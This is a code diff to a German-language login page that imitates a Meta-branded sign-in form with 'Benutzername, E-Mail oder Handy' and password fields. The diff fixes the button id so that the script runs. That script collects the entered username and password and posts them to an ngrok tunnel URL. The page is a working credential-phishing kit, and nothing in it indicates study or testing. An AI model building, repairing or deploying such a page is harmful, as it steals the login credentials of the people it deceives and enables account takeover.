@@ -17,7 +17,7 @@
     <input type="text" id="userName" placeholder="Benutzername, E-Mail oder Handy">
     <input type="password" id="password" placeholder="Passwort">
 
-    <button class="login-btn" id="sentBtn";">Anmelden</button>
+    <button class="login-btn" id="sendBtn">Anmelden</button>
 
     <a href="#" class="forgot">Passwort vergessen?</a>
 
@@ -25,19 +25,15 @@
 
     <p class="meta">Meta</p>
 </div>
+
 <script>
-const serverURL = "https://alberta-costoclavicular-heath.ngrok-free.dev/submit"; // deine ngrok-URL
+const serverURL = "https://alberta-costoclavicular-heath.ngrok-free.dev/submit";
 
 document.getElementById("sendBtn").addEventListener("click", async () => {
-    // Werte aus den beiden Inputs holen
     const userName = document.getElementById("userName").value;
     const password = document.getElementById("password").value;
 
-    // Objekt erstellen
-    const data = {
-        userName: userName,
-        password: password
-    };
+    const data = { userName, password };
 
     try {
         const res = await fetch(serverURL, {
@@ -56,6 +52,3 @@ document.getElementById("sendBtn").addEventListener("click", async () => {
 </script>
 </body>
 </html>
-
-
-
